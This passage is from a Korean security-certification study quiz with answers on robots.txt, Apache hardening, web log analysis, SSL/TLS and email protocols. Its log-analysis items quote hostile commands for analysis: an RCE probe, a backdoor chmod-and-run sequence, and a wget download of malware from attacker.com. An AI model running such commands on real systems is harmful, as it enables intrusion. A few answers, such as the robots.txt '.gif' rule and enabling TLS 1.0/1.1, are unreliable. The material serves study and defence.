<summary>(서술형) <code>robots.txt</code> 파일을 작성하여 서버에 적용할 시, 파일의 <strong>물리적 위치</strong>에 대해 반드시 지켜야 할 규칙과 그 이유를 서술하시오.</summary>
<blockquote>
<strong>정답:</strong> 반드시 웹 사이트의 <strong>최상위(루트) 디렉터리</strong>(예: <code>/robots.txt</code>)에 위치해야 한다. 검색 로봇은 사이트 방문 시 루트 디렉터리만을 확인하므로, 하위 디렉터리에 위치할 경우 설정의 효력이 발생하지 않는다.
</blockquote>
</details>

<details>
<summary>(서술형) <code>Disallow: /private/</code>와 <code>Disallow: /private</code> 설정이 검색 로봇에게 주는 차단 명령의 차이점(매칭 범위)을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> <code>/private/</code>는 해당 <strong>디렉터리 전체</strong>를 차단하는 의미인 반면, <code>/private</code>는 파일과 디렉터리를 가리지 않고 <strong>"private"라는 문자열로 시작하는 모든 경로</strong>를 차단하는 의미를 갖는다.
</blockquote>
</details>

<details>
<summary>(작업형) 모든 검색 로봇에 대해 웹 사이트 전체의 정보를 수집하지 못하도록 차단하는 <code>robots.txt</code> 설정을 작성하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
<code>User-agent: *</code><br>
<code>Disallow: /</code>
</blockquote>
</details>

<details>
<summary>(작업형) 구글 이미지 검색 로봇(<code>Googlebot-image</code>)에 대해 모든 <code>.gif</code> 파일의 수집을 차단하는 설정을 완성하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
<code>User-agent: Googlebot-image</code><br>
<code>Disallow: /.gif$</code>
</blockquote>
</details>

<details>
<summary>(작업형) 다음 <code>robots.txt</code> 설정 예시에서 <strong>띄어쓰기</strong> 및 <strong>식별자</strong> 관련 오류 2가지를 지적하고 올바르게 수정하시오.<br><code>user-agent : *</code><br><code>Disallow:/private/</code></summary>
<blockquote>
<strong>정답:</strong><br>
1. <strong>user-agent</strong>: 'u'를 대문자로 수정하고 콜론(<code>:</code>)은 지시어에 붙여 써야 함 → <strong>User-agent: *</strong><br>
2. <strong>Disallow</strong>: 콜론(<code>:</code>) 이후에 반드시 공백 한 칸을 두어야 함 → <strong>Disallow: /private/</strong>
</blockquote>
</details>

<details>
<summary>[566] (단답형) 웹 사이트의 루트 디렉터리에 위치하며, 검색 엔진의 웹 크롤러(로봇)가 접근해도 되는 페이지와 접근해서는 안 되는 페이지(관리자 페이지 등)를 명시하여 검색 노출을 제어하는 표준 파일의 명칭을 쓰시오.</summary>
<blockquote>
<code>robots.txt</code>
</blockquote>
</details>

### 기타 웹서버 보안 대책(아파치 기준)

<details>
<summary>[기출 19회 7번 문제] (단답형) 아파치 웹서버의 로그 중 정상 접속을 기록하는 로그(A), 오류 상황을 기록하는 로그(B), 그리고 로그 경로를 설정하는 메인 설정 파일(C)을 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>access_log</strong> (또는 Access 로그), (B) <strong>error_log</strong> (또는 Error 로그), (C) <strong>httpd.conf</strong>
</blockquote>
</details>

<details>
<summary>[기출 20회 8번 문제] (단답형) 아파치 설정에서 디렉터리 인덱싱 취약점을 해결하기 위해 <code>Options</code> 지시자에서 삭제해야 할 항목은 무엇인가?</summary>
<blockquote>
<strong>정답:</strong> <strong>Indexes</strong> (또는 <code>-Indexes</code>로 설정)
</blockquote>
</details>

<details>
<summary>(단답형) 웹 서버 프로세스가 탈취되더라도 시스템 전체 권한을 뺏기지 않도록, 마스터 프로세스를 제외한 자식 프로세스를 제한된 권한의 계정(예: apache, nobody)으로 구동하기 위해 사용하는 지시어 2가지는?</summary>
<blockquote>
<strong>정답:</strong> <strong>User, Group</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 아파치에서 80번(HTTP) 포트를 열기 위해 마스터 프로세스는 반드시 어떤 사용자의 권한으로 실행되어야 하는가?</summary>
<blockquote>
<strong>정답:</strong> <strong>root</strong> (유닉스 계열에서 1024 미만 포트는 특권 포트이므로 root만 오픈 가능)
</blockquote>
</details>

<details>
<summary>(단답형) 유닉스/리눅스의 이 기능을 이용하면 웹 루트 외부의 <code>/etc/passwd</code> 등을 참조할 위험이 있다. 이를 차단하기 위해 <code>Options</code> 지시어에서 삭제해야 하는 기능은?</summary>
<blockquote>
<strong>정답:</strong> <strong>FollowSymLinks</strong> (심볼릭 링크 사용 설정)
</blockquote>
</details>

<details>
<summary>(단답형) HTTP 응답 헤더의 <code>Server</code> 필드에 서버의 상세 버전이나 OS 정보를 제외하고 가장 최소한의 정보(예: Apache)만 노출하도록 지정하는 설정값은?</summary>
<blockquote>
<strong>정답:</strong> <strong>ServerTokens Prod</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 웹 서버에서 응답 시 생성하는 에러 페이지 하단에 서버 버전, 포트, 호스트명 등의 정보를 출력할지 여부를 결정하는 지시어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>ServerSignature</strong> (보안상 <strong>Off</strong> 권장)
</blockquote>
</details>

<details>
<summary>(단답형) 클라이언트가 특정 파일명이 아닌 디렉터리 경로만 요청했을 때, 우선적으로 검색하여 응답할 파일 목록(index.html 등)을 지정하는 지시어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>DirectoryIndex</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 웹 사이트의 소스 코드나 자원들이 위치하는 최상위 디렉터리 경로를 지정하는 아파치 지시어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>DocumentRoot</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 동일 클라이언트와의 TCP 연결을 일정 시간 유지하여 다수의 HTTP 요청을 처리하게 함으로써 서버 부하를 줄이는 기능은?</summary>
<blockquote>
<strong>정답:</strong> <strong>KeepAlive</strong> (보안상 <strong>On</strong> 권장)
</blockquote>
</details>

<details>
<summary>(단답형) <strong>Slow HTTP header DoS</strong> 공격이나 <strong>Slow HTTP POST</strong> 공격에 효과적으로 대응하기 위해 요청의 수신 한계 시간을 지정하는 지시어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>RequestReadTimeout</strong>
</blockquote>
</details>

<details>
<summary>(서술형) 웹 서버 프로세스 구동용 계정(apache 등)을 생성할 때, 해당 사용자 정보의 로그인 쉘을 <strong>/sbin/nologin</strong>(또는 /bin/false)으로 설정하는 이유는?</summary>
<blockquote>
<strong>정답:</strong> 해당 계정은 웹 서버 프로세스 실행만을 위한 목적이므로, 공격자가 해당 계정 정보를 탈취하더라도 <strong>실제 리눅스 시스템에 직접 로그인(Shell 획득)하는 행위</strong>를 원천적으로 차단하여 시스템 접근을 방지하기 위함이다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>KeepAliveTimeout</strong> 지시어의 설정값(초)의 의미를 클라이언트의 요청 패킷 전달 관점에서 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> <code>KeepAlive</code> 기능이 활성화된 상태에서, 서버가 클라이언트로부터 마지막 요청을 받은 후 <strong>다음 요청이 올 때까지 통신 없이 대기하는 최대 시간</strong>을 의미한다. 이 시간을 초과해도 추가 요청이 없으면 서버는 강제로 연결을 종료한다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>ServerTokens</strong> 설정을 <code>Full</code> 대신 <code>Prod</code>로 설정했을 때 얻을 수 있는 보안적 이점을 공격자의 <strong>배너 정보 수집(Banner Grabbing)</strong> 관점에서 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 공격자는 <code>Server</code> 헤더 정보를 통해 서버의 정밀한 버전과 운영체제를 파악하여 해당 버전에 알려진 최신 취약점을 선택하여 공격한다. <code>Prod</code> 설정을 통해 "Apache"라는 최소 정보만 노출하면 공격자가 <strong>공격 대상을 선정하고 정밀하게 Exploit을 구성하는 것을 어렵게 만드는 효과</strong>가 있다.
</blockquote>
</details>

<details>
<summary>(작업형) 아파치 웹 서버의 모든 디렉터리에 대해 심볼릭 링크 참조 기능과 디렉터리 리스팅 기능을 모두 제거하기 위한 설정을 완성하시오.</summary>
<blockquote>
<code>&lt;Directory /&gt;</code><br>
<code> Options <strong>(빈칸)</strong></code><br>
<code> AllowOverride All</code><br>
<code>&lt;/Directory&gt;</code><br>
<br>
<strong>정답:</strong> <strong>None</strong>
</blockquote>
</details>

<details>
<summary>(작업형) <strong>Slow HTTP DoS</strong> 공격을 방어하기 위해 헤더(header) 수신은 5초, 바디(body) 수신은 10초로 제한하는 구문을 작성하시오.</summary>
<blockquote>
<strong>정답:</strong> <code>RequestReadTimeout header=5 body=10</code>
</blockquote>
</details>

<details>
<summary>(작업형) 다음 지시어들 중 <strong>시간(초 단위)</strong>과 관련이 있는 설정값들로만 묶은 것은? (Timeout, KeepAlive, MaxKeepAliveRequests, KeepAliveTimeout)</summary>
<blockquote>
<strong>정답:</strong> <strong>Timeout, KeepAliveTimeout</strong> (<code>KeepAlive</code>는 사용 여부 On/Off, <code>MaxKeepAliveRequests</code>는 건수)
</blockquote>
</details>

<details>
<summary>[기출 21회 10번 문제] (단답형) 아파치(Apache)의 <code>httpd.conf</code> 파일에서 디렉터리에 업로드 가능한 최대 파일 사이즈를 제한하는 지시어(명령어)는?</summary>
<blockquote>
<strong>정답:</strong> <strong>LimitRequestBody</strong>
</blockquote>
</details>

### 웹 로그 분석

<details>
<summary>(단답형) 클라이언트의 요청 자원 정보, 처리 결과(상태 코드), 전송 크기 등을 기록하며 침해사고 분석의 핵심 증거가 되는 로그 파일의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>액세스 로그 (access_log)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 아파치(Apache)의 기본 로그 형식(CLF)에 <strong>Referer</strong>와 <strong>User-Agent</strong> 기능을 추가하여 상세한 분석이 가능하도록 한 포맷은?</summary>
<blockquote>
<strong>정답:</strong> <strong>NCSA ELF (Extended Log Format)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) IIS 웹 서버에서 주로 사용하는 포맷으로, 쿠키 정보와 사용자 정보를 추가로 기록할 수 있는 로그 형식은?</summary>
<blockquote>
<strong>정답:</strong> <strong>W3C ELF</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 액세스 로그의 필드 중, 현재 요청된 페이지를 링크하거나 참조한 이전 페이지의 URL 정보를 담고 있는 항목은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Referer</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 로그 파일에서 <code>"GET /index.jsp HTTP/1.1" 200 234</code>와 같이 기록되었을 때, 숫자 <strong>234</strong>가 의미하는 바는?</summary>
<blockquote>
<strong>정답:</strong> 서버에서 클라이언트로 전송된 <strong>응답 데이터의 크기</strong> (Bytes, 헤더 제외)
</blockquote>
</details>

<details>
<summary>(서술형) 보안 사고 발생 전후로 <strong>웹 로그 분석</strong>을 통해 얻고자 하는 정보나 목적 3가지를 기술하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1. <strong>해킹 시도 파악</strong>: 비정상적인 URL 요청이나 특수문자 삽입 등을 통해 공격 패턴을 식별한다.<br>
2. <strong>성공 여부 확인</strong>: HTTP 상태 코드(200 OK 등)를 분석하여 실제 침투나 정보 유출이 발생했는지 판별한다.<br>
3. <strong>추적 및 증거 확보</strong>: 공격자의 IP 주소, 공격 시간, 침입 경로(Referer) 등을 파악하여 사후 대응의 증거로 활용한다.
</blockquote>
</details>

<details>
<summary>(서술형) 다음 로그를 보고 공격자가 <code>id</code> 명령어를 전송한 구체적인 목적 2가지를 설명하시오.<br><code>… "GET /zboard/…/print_category.php?…&cmd=id HTTP/1.1" 200 …</code></summary>
<blockquote>
<strong>정답:</strong> 1. 해당 파라미터가 <strong>원격 명령 실행(RCE)</strong> 취약점에 노출되어 있는지 실제 동작 여부를 테스트하기 위함이다. 2. <code>id</code> 명령의 출력 결과(uid, gid)를 통해 현재 웹 서버가 구동 중인 <strong>시스템 권한</strong>을 확인하기 위함이다.
</blockquote>
</details>

<details>
<summary>(서술형) 웹 로그 분석 중 <strong>403 Forbidden</strong>과 <strong>404 Not Found</strong> 상태 코드가 반복적으로 발생하는 상황을 보안 관점에서 각각 해석하시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>403</strong> 에러의 반복은 공격자가 접근 제어가 설정된 중요 디렉터리(admin 등)를 찾아내기 위해 탐색 중임을 의미하며, <strong>404</strong> 에러의 반복은 서버 내에 존재하는 취약한 파일이나 숨겨진 페이지를 찾기 위해 파일명을 무작위로 대입(Brute Force)하는 스캐닝 행위로 해석할 수 있다.
</blockquote>
</details>

<details>
<summary>(작업형) 다음 로그 내용을 URL 디코딩하여 공격자가 <code>/tmp</code> 디렉터리에서 수행한 행위의 순서를 기술하시오.<br><code>"cmd=cd%20/tmp%20;%20chmod%20777%20rOnin%20;%20./rOnin"</code></summary>
<blockquote>
<strong>정답:</strong><br>
1. <code>cd /tmp</code>: 임시 디렉터리인 /tmp로 이동한다.<br>
2. <code>chmod 777 rOnin</code>: 이전에 내려받은 백도어 프로그램(rOnin)에 모든 권한을 부여한다.<br>
3. <code>./rOnin</code>: 해당 백도어 프로그램을 실행한다.
</blockquote>
</details>

<details>
<summary>(작업형) 다음 로그에서 공격자가 사용한 명령어 <code>wget -P /var/tmp/ http://attacker.com/rootedoor</code>의 의미를 분석하시오.</summary>
<blockquote>
<strong>정답:</strong> <code>wget</code> 명령어를 사용하여 원격지 공격자 서버로부터 <strong>rootedoor</strong>라는 악성 파일을 내려받아, 타겟 시스템 내부의 <strong>/var/tmp/</strong> 디렉터리에 저장(<code>-P</code> 옵션)하는 행위이다.
</blockquote>
</details>

<details>
<summary>(작업형) 아파치 NCSA ELF 로그 포맷의 구성 요소 9가지를 발생 순서대로 나열하시오.</summary>
<blockquote>
<strong>정답:</strong> Host, Ident, Authuser, Date and Time, Request, Status, Bytes, Referer, User-Agent
</blockquote>
</details>

<details>
<summary>(작업형) 특정 웹 서버의 로그를 확인하니 <code>User-Agent</code> 필드에 <strong>sqlmap</strong> 또는 <strong>Nessus</strong>라는 문자열이 발견되었다. 이를 통해 유추할 수 있는 상황은?</summary>
<blockquote>
<strong>정답:</strong> 일반적인 사용자의 브라우저 접속이 아니라, 자동화된 <strong>취약점 스캐닝 도구</strong>를 사용하여 웹 사이트를 공격하거나 정보를 수집하고 있는 상황이다.
</blockquote>
</details>

### Security Server 구축

<details>
<summary>(단답형) 인터넷상에서 개인정보 등 중요 데이터를 암호화하여 송수신할 수 있는 기능을 갖춘 웹 서버를 무엇이라 하는가?</summary>
<blockquote>
<strong>정답:</strong> <strong>보안 서버 (Security Server)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 보안 서버 구축을 통해 얻을 수 있는 대표적인 보안 효과 3가지는 정보 유출 방지(Sniffing 방지), 기업 신뢰도 향상, 그리고 (1)이다.</summary>
<blockquote>
<strong>정답:</strong> <strong>가짜 사이트 방지</strong> (또는 <strong>피싱 방지</strong>)
</blockquote>
</details>

<details>
<summary>(단답형) 「개인정보 보호법」 및 관련 고시에 따라 개인정보처리자가 인터넷망으로 인증정보나 개인정보를 전송할 때 반드시 이행해야 하는 기술적 조치는?</summary>
<blockquote>
<strong>정답:</strong> <strong>안전한 암호 알고리즘으로 암호화하여 송·수신</strong>
</blockquote>
</details>

<details>
<summary>(단답형) SSL/TLS 인증서의 보안성을 확보하기 위해 권장되는 RSA 키 쌍의 최소 길이는?</summary>
<blockquote>
<strong>정답:</strong> <strong>2048-Bit</strong> 이상
</blockquote>
</details>

<details>
<summary>(단답형) 인증서 서명 시 보안성이 낮은 SHA-1 대신 사용하여야 하는 256비트 이상의 해시 알고리즘 표준은?</summary>
<blockquote>
<strong>정답:</strong> <strong>SHA-2 (SHA-256 이상)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 인증서 발급 시 주체(Subject)의 <strong>Common Name(CN)</strong> 필드에는 무엇을 정확히 명시해야 하는가?</summary>
<blockquote>
<strong>정답:</strong> 접속에 사용될 <strong>서버의 도메인 주소</strong> (Full Domain Name)
</blockquote>
</details>

<details>
<summary>(단답형) 아파치(Apache)의 SSL 설정 파일에서 서버가 지원할 SSL/TLS 프로토콜의 버전을 지정하는 지시어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>SSLProtocol</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 암호 도구 목록(Cipher Suite) 설정 시 암호화 기능이 없는 항목을 명시적으로 제거하기 위해 사용하는 태그는?</summary>
<blockquote>
<strong>정답:</strong> <strong>!eNULL</strong>
</blockquote>
</details>

<details>
<summary>(서술형) 보안 서버(SSL/TLS)가 <strong>피싱(Phishing)</strong> 공격을 예방할 수 있는 원리를 인증서의 신뢰 관계 관점에서 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> SSL/TLS 인증서는 신뢰할 수 있는 <strong>인증기관(CA)</strong>에 의해 해당 도메인의 소유주가 진짜임을 증명한다. 공격자가 위조 사이트를 개설하더라도 동일한 도메인의 유효한 인증서를 제시할 수 없으므로, 사용자는 브라우저의 <strong>보안 경고 메시지</strong>를 통해 진짜 사이트 여부를 식별하고 피해를 예방할 수 있다.
</blockquote>
</details>

<details>
<summary>(서술형) 아파치 SSL 설정 중 <code>SSLProtocol all -SSLv2 -SSLv3</code> 구문의 의미와 보안적 목적을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>의미</strong>: 모든 SSL/TLS 버전을 지원하되(all), 보안상 취약한 <strong>SSL 2.0(-SSLv2)과 SSL 3.0(-SSLv3)은 사용을 금지(비활성화)</strong>한다는 뜻이다.<br>
- <strong>목적</strong>: POODLE 공격 등 구형 프로토콜의 알려진 취약점을 이용한 공격을 원천 차단하기 위함이다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>수출용(EXPORT)</strong> Cipher Suite을 모두 제거해야 하는 역사적 배경과 보안적 이유를 서술하시오.</summary>
<blockquote>
<strong>정답:</strong> 90년대 미국의 암호 시스템 수출 제한 정책에 따라 의도적으로 약한 키 길이를 사용하도록 설계된 방식이다. 현재의 컴퓨팅 능력으로는 <strong>쉽게 복호화가 가능할 정도의 낮은 암호 강도</strong>를 갖기 때문에 기밀성 보장을 위해 반드시 제거해야 한다.
</blockquote>
</details>

<details>
<summary>(서술형) 익명 디피-헬만(<strong>ADH</strong>) 방식이 보안상 취약한 이유와 이에 대한 대안인 임시 디피-헬만(<strong>EDH/DHE</strong>)의 차이점을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>ADH</strong>는 키 교환 과정에서 상대방을 확인하는 <strong>인증 과정이 없어</strong> 중간자 공격(MITM)에 매우 취약하다. 반면 <strong>EDH(DHE)</strong>는 RSA나 DSA 등의 디지털 서명 알고리즘을 통해 서버의 파라미터를 인증하므로 키 교환의 안전성이 보장된다.
</blockquote>
</details>

<details>
<summary>(작업형) OpenSSL 도구를 사용하여 2048비트 RSA 개인키를 AES-128 방식으로 암호화하여 <code>server.key</code> 파일로 생성하는 명령어를 작성하시오.</summary>
<blockquote>
<strong>정답:</strong> <code>openssl genrsa -aes128 -out server.key 2048</code>
</blockquote>
</details>

<details>
<summary>(작업형) 사용자는 브라우저에 <code>https://192.168.1.10</code>을 입력했으나, 실제 서버의 SSL 인증서에는 <code>CN = www.bank.com</code>으로 설정되어 있다. 이때 발생하는 현상과 원인을 기술하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>현상</strong>: 브라우저에 "보안 인증서에 문제가 있습니다"라는 <strong>인증서 이름 불일치 경고</strong>가 표시된다.<br>
- <strong>원인</strong>: 사용자가 입력한 접속 대상(URL 상의 IP)과 서버가 제시한 인증서의 소유자 정보(Common Name)가 일치하지 않기 때문이다.
</blockquote>
</details>

<details>
<summary>(작업형) 다음 Cipher Suite 설정 문자열의 의미를 태그별로 분석하시오.<br><code>SSLCipherSuite ALL:!aNULL:!RC4:!MD5</code></summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>ALL</strong>: 모든 암호 도구 세트를 지원 가능 리스트에 포함한다.<br>
- <strong>!aNULL</strong>: 익명 인증 등 인증 과정이 없는 방식을 제외한다.<br>
- <strong>!RC4</strong>: 취약한 스트림 암호 방식인 RC4를 제외한다.<br>
- <strong>!MD5</strong>: 충돌 위협이 있는 MD5 해시 알고리즘 사용 방식을 제외한다.
</blockquote>
</details>

<details>
<summary>(작업형) 아파치에서 TLS 1.0, 1.1, 1.2 버전만 활성화하고 나머지는 모두 비활성화하는 <code>SSLProtocol</code> 지시어 설정을 작성하시오.</summary>
<blockquote>
<strong>정답:</strong> <code>SSLProtocol -all +TLSv1 +TLSv1.1 +TLSv1.2</code>
</blockquote>
</details>

## [10] 이메일(E-mail) 보안

### 이메일 시스템 구조

<details>
<summary>(단답형) 사용자가 메일을 작성, 발송 및 수신 확인하기 위해 사용하는 아웃룩, 썬더버드와 같은 클라이언트 소프트웨어를 통칭하는 용어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>MUA (Mail User Agent)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 메일 서버(Sendmail, Qmail 등)에 해당하며 메일을 분석하여 동일 서버 혹은 외부 메일 서버로 전달(릴레이)하는 에이전트는?</summary>
<blockquote>
<strong>정답:</strong> <strong>MTA (Mail Transfer Agent)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 최종 수신지 서버에 도착한 메일을 실제 사용자의 메일함(Mailbox)에 적절히 저장해 주는 에이전트는?</summary>
<blockquote>
<strong>정답:</strong> <strong>MDA (Mail Delivery Agent)</strong> (예: Procmail)
</blockquote>
</details>

<details>
<summary>(단답형) 메일 클라이언트(MUA)가 사용자의 메일함에서 메일을 읽어갈 수 있도록 POP3나 IMAP 프로토콜을 통해 전달해 주는 에이전트는?</summary>
<blockquote>
<strong>정답:</strong> <strong>MRA (Mail Retrieval Agent)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) SMTP 프로토콜이 메일을 전송하기 전, 수신자의 도메인을 확인하여 해당 메일 서버의 위치를 파악하기 위해 질의하는 DNS 레코드는?</summary>
<blockquote>
<strong>정답:</strong> <strong>MX (Mail Exchanger)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 메일 전송 도중 장애가 발생하거나 전송 전 임시로 대기 중인 메일들이 보관되는 센드메일의 큐 디렉터리 경로는?</summary>
<blockquote>
<strong>정답:</strong> <strong>/var/spool/mqueue</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 메일을 읽어오는 프로토콜 중, 서버에서 메일을 복사해 오며 서버와 실시간 동기화가 가능하여 여러 기기에서 동시 확인이 용이한 프로토콜은?</summary>
<blockquote>
<strong>정답:</strong> <strong>IMAP</strong> (포트 143, 보안 적용 시 993)
</blockquote>
</details>

<details>
<summary>(서술형) <strong>POP3</strong>와 <strong>IMAP</strong>의 결정적인 동작 방식 차이를 서버에 남는 원본 메일의 유지 여부 관점에서 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>POP3</strong>는 클라이언트가 메일을 가져올 때 기본적으로 서버에서 해당 메일을 다운로드 후 삭제하므로 다른 기기에서 재확인이 어렵다. 반면, <strong>IMAP</strong>은 서버에서 메일을 복사해 오고 삭제하지 않으므로, 여러 클라이언트가 서버상의 동일한 메일함을 공유하고 상태를 동기화할 수 있다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>SMTP</strong>와 <strong>SMTPS</strong>의 차이점을 사용하는 포트 번호와 보안 구현 방식의 관점에서 서술하시오.</summary>
<blockquote>
<strong>정답:</strong> 일반 <strong>SMTP</strong>는 <strong>25번 포트</strong>를 사용하며 평문으로 통신하여 스니핑에 취약하다. <strong>SMTPS</strong>는 <strong>465번 포트</strong>를 사용하며 통신 구간 전체를 SSL/TLS로 암호화하여 메시지 본문과 계정 정보를 보호한다.
</blockquote>
</details>

<details>
<summary>(서술형) 메일 시스템에서 <strong>MTA</strong>가 수행하는 핵심 기능 2가지를 해당 메일의 수신자 주소와 연관 지어 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 1. 수신자가 자신의 도메인 사용자일 경우, <strong>MDA</strong>에 메일을 전달하여 사용자의 메일함에 저장한다. 2. 수신자가 외부 도메인 사용자일 경우, 해당 도메인의 메일 서버로 메일을 전달하는 <strong>릴레이(Relay)</strong> 기능을 수행한다.
</blockquote>
</details>

<details>
<summary>(작업형) 다음 서비스들이 기본적으로 사용하는 TCP 포트 번호를 빈칸에 기입하시오.<br>(1) SMTP: 25 / (2) POP3: ( ) / (3) IMAP: ( ) / (4) IMAPS: ( ) / (5) POP3S: ( )</summary>
<blockquote>
<strong>정답:</strong> (2) <strong>110</strong>, (3) <strong>143</strong>, (4) <strong>993</strong>, (5) <strong>995</strong>
</blockquote>
</details>

<details>
<summary>(작업형) 리눅스 센드메일 서버에서 각 사용자별로 수집된 실제 메일 데이터들이 텍스트 파일 형태로 보관되는 시스템 디렉터리 경로는?</summary>
<blockquote>
<strong>정답:</strong> <strong>/var/spool/mail</strong>
</blockquote>
</details>

<details>
<summary>(작업형) 이메일 송수신 전체 과정을 순서대로 나열할 때 빈칸을 완성하시오.<br>MUA(송신) -> ( ) -> ( ) -> 인터넷 -> 수신측 MTA -> MDA -> ( ) -> ( ) -> MUA(수신)</summary>
<blockquote>
<strong>정답:</strong> <strong>MTA(송신) -> 메일 큐 -> 메일함 -> MRA</strong>
</blockquote>
</details>

### SMTP 메일 형식

<details>
<summary>(단답형) 메일 서버 간 통신 시 실제 전송 경로를 제어하기 위한 주소 정보를 담고 있으며, 메일 수신자에게는 직접 보이지 않는 영역은?</summary>
<blockquote>
<strong>정답:</strong> <strong>봉투 (Envelope)</strong> (MAIL FROM, RCPT TO 등)
</blockquote>
</details>

<details>
<summary>(단답형) 메일 수신자가 실제로 확인하게 되는 제목, 발신인 주소, 송신 날짜 등의 정보를 포함하는 부분의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>메시지 헤더 (Message Header)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) SMTP 명령어 중 수신자 메일 주소를 서버에 알리기 위해 사용하는 명령어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>RCPT TO:</strong>
</blockquote>
</details>

<details>
<summary>(단답형) SMTP 통신 절차에서 실제 메일 본문을 전송하기 시작함을 서버에 알리는 명령어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>DATA</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 텍스트 전송의 끝을 알리기 위해 사용하는 특수 문자열 조합(또는 기호)은?</summary>
<blockquote>
<strong>정답:</strong> <strong>&lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</strong> (또는 단순히 <strong>.</strong>)
</blockquote>
</details>

<details>
<summary>(단답형) 발신 서버의 IP 주소를 DNS에 등록된 SPF 레코드와 대조하여 발신 도메인의 정당성을 검증하는 기술은?</summary>
<blockquote>
<strong>정답:</strong> <strong>SPF (Sender Policy Framework)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 메일 헤더와 본문의 해시값을 발신자의 개인키로 서명하여 전송 도중 위변조 여부를 확인하는 기술은?</summary>
<blockquote>
<strong>정답:</strong> <strong>DKIM (DomainKeys Identified Mail)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) SPF와 DKIM의 인증 결과를 통합하여 일관된 보안 정책을 적용하고 인증 실패 시의 처리 방안을 리포팅하는 기술은?</summary>
<blockquote>
<strong>정답:</strong> <strong>DMARC (Domain-based Message Authentication, Reporting and Conformance)</strong>
</blockquote>
</details>

<details>
<summary>(서술형) 메일 봉투(Envelope)의 <strong>MAIL FROM</strong>과 메시지 헤더의 <strong>From</strong> 정보의 차이점 및 보안적 시사점을 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> <code>MAIL FROM</code>은 서버 간 전송을 위한 <strong>실제 발신 주소</strong>이고, <code>From</code>은 사용자에게 표시되는 <strong>형형상의 발신 주소</strong>이다. 공격자는 두 정보를 모두 조작하여 수신 서버를 속이거나(스푸핑), 최종 사용자가 신뢰할 수 있는 기관이 보낸 것처럼 오인하게 만들어 피싱 성공률을 높인다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>SPF</strong> 기술이 메일 스푸핑을 막는 원리를 DNS의 역할과 관련 지어 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 메일 수신 측 서버가 메일을 받았을 때, 메일 발송 도메인의 <strong>DNS 서버에 등록된 SPF(TXT) 레코드</strong>를 조회한다. 해당 레코드에 기재된 IP 주소 목록과 실제 메일을 보낸 서버의 IP 주소가 일치하는지 대조함으로써, 인가되지 않은 서버의 사칭 여부를 판단한다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>DKIM</strong>이 발신 도메인의 신뢰성을 보장하는 기술적 방법을 <strong>디지털 서명</strong>의 원리로 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 발신 서버가 메일을 보낼 때 헤더와 본문 내용에 대한 <strong>디지털 서명</strong>을 생성하여 메일 헤더에 추가한다. 수신 서버는 발신 도메인의 DNS에서 공개키를 가져와 서명을 검증함으로써, 메일 내용이 전송 도중 수정되지 않았음(<strong>무결성</strong>)과 발신 도메인의 정당성(<strong>인증</strong>)을 확인한다.
</blockquote>
</details>

<details>
<summary>(작업형) SMTP 통신 과정을 순서대로 나열할 때 빈칸에 알맞은 명령어를 기입하시오.<br>연결 요청 -> (1) -> (2) -> (3) -> (4) -> 본문 전송 -> (5) -> QUIT</summary>
<blockquote>
<strong>정답:</strong> (1) HELO (또는 EHLO), (2) MAIL FROM, (3) RCPT TO, (4) DATA, (5) . (마침표)
</blockquote>
</details>

<details>
<summary>(작업형) 다음 항목들을 <strong>Envelope(봉투)</strong> 영역과 <strong>Header(헤더)</strong> 영역으로 분류하시오.<br>(MAIL FROM, Subject, Date, RCPT TO, From, Received)</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>Envelope(봉투)</strong>: MAIL FROM, RCPT TO<br>
